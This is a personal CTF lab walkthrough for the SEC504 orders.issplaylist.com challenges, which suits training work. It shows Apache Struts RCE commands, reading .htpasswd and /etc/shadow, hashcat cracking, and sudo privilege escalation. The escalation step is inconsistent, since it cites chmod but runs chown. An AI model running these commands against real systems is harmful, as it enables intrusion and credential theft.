# SEC504 Ranges.io CTF - Walkthrough

This document contains my personal step-by-step solutions for the **orders.issplaylist.com** section challenges. 
I’ve written it as if I am walking someone through how I solved each challenge, including the reasoning, challenges I faced, and how I worked through them. 

---

## Search Engine Restriction
**Question:** 
Retrieve the search engine restriction resource on the web server orders.issplaylist.com. Enter the flag.

**Steps Taken:**
At first this question seemed a little tricky, but the hint was in the wording: “search engine restriction.” I immediately thought about how websites tell search engines what to index or not index, which is done using the `robots.txt` file. With that in mind, I decided to directly check for the file by typing in the URL: 

```
https://orders.issplaylist.com/robots.txt
```

Sure enough, the file was there, and it revealed the flag. 

**Flag:** 
`NetWars{ValuableReconData}`

---

## Apache Struts Version
**Question:** 
Using the information on the orders.issplaylist.com website, identify the version of Apache Struts in use.

**Steps Taken:**
Once again, I went back to the `robots.txt` file because these files often contain directory disallows or hints about what the site is running. As I scrolled through the contents, I found a very telling line: 

```
Disallow: struts2-showcase-2.3.14
```

This immediately told me the Apache Struts version in use was **2.3.14**. 

**Answer:** 
`2.3.14`

---

## Vulnerability Research
**Question:** 
Research the version of Apache Struts using in-game assets. Which CVE entry describes a known vulnerability for this version of Apache Struts?

**Steps Taken:**
To answer this, I used **ClippedBin**, the OSINT resource provided in the CTF. I typed “struts” into the search bar and scanned the results. Among them was an exploit post, and at the top of that post in the comment area, I found the CVE reference. This CVE tied directly to the Apache Struts version I had identified earlier. 

**Answer:** 
`CVE-2018-11776`

---

## Exploit Identification
**Question:** 
Using in-game assets, identify an exploit left behind by the attackers. Enter the name of the exploit code author (first and last).

**Steps Taken:**
Still working within **ClippedBin**, I opened the exploit code that corresponded to CVE-2018-11776. Right at the top of the script, the author had left their name in the comments. That’s how I was able to clearly identify the person behind it. 

**Answer:** 
`Mazin Ahmed`

---

## Vulnerability Exploitation
**Question:** 
Use the exploit to gain access to the orders.issplaylist.com server. Retrieve the flag in the `/opt/tomcat/webapps/ROOT` directory.

**Steps Taken:**
This step took a lot more trial and error. I started by copying the exploit code I had found and saved it as `struts-exploit.py`. To make sure it was executable, I ran: 

```bash
chmod 755 struts-exploit.py
```

I first checked the script’s usage instructions with: 

```bash
./struts-exploit.py -h
```

I tried running it directly against the base site URL, but it came back saying the target was not vulnerable. For a moment I thought maybe I had gone down the wrong path, but then I realized I was probably missing a critical detail. 

After researching more about the exploit script, I found out that it mentioned needing a **`.action` endpoint**. Sure enough, in the commented area of the exploit script in **ClippedBin** there was the target URL left by the previous attackers: 

```
http://orders.issplaylist.com/showcase/help.action
```

That was the missing piece. I re-ran the exploit, but this time against the `.action` endpoint: 

```bash
./struts-exploit.py -u https://orders.issplaylist.com/showcase/help.action -c id --exploit
```

This time, it worked! The output confirmed that the server was vulnerable, and it gave me the command execution response showing I was running as the `tomcat` user: 

```
uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)
```

Now that I had remote code execution, I wanted to locate the flag in `/opt/tomcat/webapps/ROOT`. At first, I instinctively tried to use `cd` to change into the directory, but I quickly remembered that since this wasn’t an interactive shell, that wouldn’t work. Instead, I needed to reference the path directly in my command. 

So I ran: 

```bash
./struts-exploit.py -u https://orders.issplaylist.com/showcase/help.action -c 'ls -l /opt/tomcat/webapps/ROOT/' --exploit
```

The output listed several files, and among them was the one I was after: `Flag.txt`. The permissions showed that it was readable, so all I had to do was use `cat` to dump its contents. 

```bash
./struts-exploit.py -u https://orders.issplaylist.com/showcase/help.action -c 'cat /opt/tomcat/webapps/ROOT/Flag.txt' --exploit
```

The exploit ran successfully, and the flag was printed out: 

```
NetWars{SuccessfulExploit}
```

That moment was a big win — it felt like everything clicked after the earlier false start. 

**Flag:** 
`NetWars{SuccessfulExploit}`

---

## Web Password File
**Question:** 
Using the same exploit access, examine the file used for storing encrypted passwords in the web root (`/opt/tomcat/webapps/ROOT/`). Submit the flag.

**Steps Taken:** 
At this point I knew the process: use the exploit to remotely execute commands and carefully enumerate files in the target directory. I ran another listing of `/opt/tomcat/webapps/ROOT/` to identify which file contained the password data. 

```bash
./struts-exploit.py -u https://orders.issplaylist.com/showcase/help.action -c 'ls -l /opt/tomcat/webapps/ROOT/' --exploit
```

After browsing through some directories and dumping information from files, I still couldn’t find what I was looking for. Re-reading the question, I noticed it specifically asked for the file used for storing encrypted passwords. That gave me an idea: maybe it was a hidden file. 

I listed the directory again, but this time included hidden files: 

```bash
./struts-exploit.py -u https://orders.issplaylist.com/showcase/help.action -c 'ls -la /opt/tomcat/webapps/ROOT/' --exploit
```

And there it was — a `.htpasswd` file! Dumping this file with `cat` revealed both the flag and a password hash. I saved the hash into my `credentials-store.hashes` file so I could try to crack it later. 

**Flag:** 
`NetWars{HTTPAuthHash}`

---

## Always Be Cracking
**Question:** 
Crack the password for the tomcat user using the .htpasswd file contents. Submit the plaintext password for the tomcat user.

**Steps Taken:** 
I saved the tomcat user hash into `credentials-store.hashes`. Before cracking, I identified the hash structure: 

```bash
hashcat --identify credentials-store.hashes --user
```

**Output:**
```
# | Name                                                | Category
======+=================================================+======================================
 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)           | FTP, HTTP, SMTP, LDAP Server
```

Now that I knew the type, I ran hashcat with a straight attack using the provided course wordlist: 

```bash
hashcat -a 0 -m 1600 credentials-store.hashes /usr/share/wordlists/passwords.txt --user
```

Hashcat successfully cracked the password. To confirm, I displayed the cracked value with: 

```bash
hashcat -m 1600 credentials-store.hashes --show --user
```

**Output:**
```
tomcat:$apr1$d576nE7M$UK.ZbyzeReAsq0cdrk2yP/:tacmot
```

There it was, at the end of the hash. 

**Answer:** 
`tacmot`

---

## Remote Shell
**Question:** 
Using the compromised username and password, access a shell on the target server. Submit the flag shown when logging in.

**Steps Taken:** 
With the tomcat credentials in hand, I connected with SSH: 

```bash
ssh tomcat@orders.issplaylist.com
```

When prompted, I entered the cracked password `tacmot`. The connection succeeded, and upon login, the flag was displayed. 

**Flag:** 
`NetWars{RemoteAccessSuccess}`

---

## Local Privilege Management
**Question:** 
The support system has a custom sudo configuration. Which command is the tomcat user allowed to run as root?

**Steps Taken:**  
I ran:  

```bash
sudo -l
```

The output showed that the `tomcat` user was allowed to run the `chmod` command as root.  

**Answer:**  
`chmod`

---

## Local Privilege Escalation
**Question:**  
Using the commands available through sudo, escalate privileges to gain root access on the system. Retrieve the flag stored in the /etc/shadow file.

**Steps Taken:**  
Since I had `sudo chmod` access, I ran:  

```bash
sudo chown tomcat /etc/shadow
```

After that, I was able to:  

```bash
cat /etc/shadow
```

This revealed the flag along with additional hashes, which I saved into `credentials-store.hashes` for later cracking.  

**Flag:**  
`NetWars{PrivilegedAccess}`

---

## jorestes Password
**Question:**  
What is the login password for the jorestes user account?

**Steps Taken:**  
I added the new hashes from `/etc/shadow` into `credentials-store.hashes` and then identified their type:  

```bash
hashcat --identify credentials-store.hashes --user
```

**Output:**
```
# | Name                                                | Category
======+=================================================+======================================
  500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)       | Operating System
 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)           | FTP, HTTP, SMTP, LDAP Server
```

I then cracked the hashes with:  

```bash
hashcat -a 0 -m 500 credentials-store.hashes /usr/share/wordlists/passwords.txt --user
```

The results revealed the plaintext password for the `jorestes` account.  

**Answer:**  
`Carolina1`

---

## pemma Password
**Question:**  
What is the login password for the pemma user account?

**Steps Taken:**  
Since I had already cracked the hash file with hashcat, the results also revealed the plaintext password for the `pemma` account.  

**Answer:**  
`spacestation`

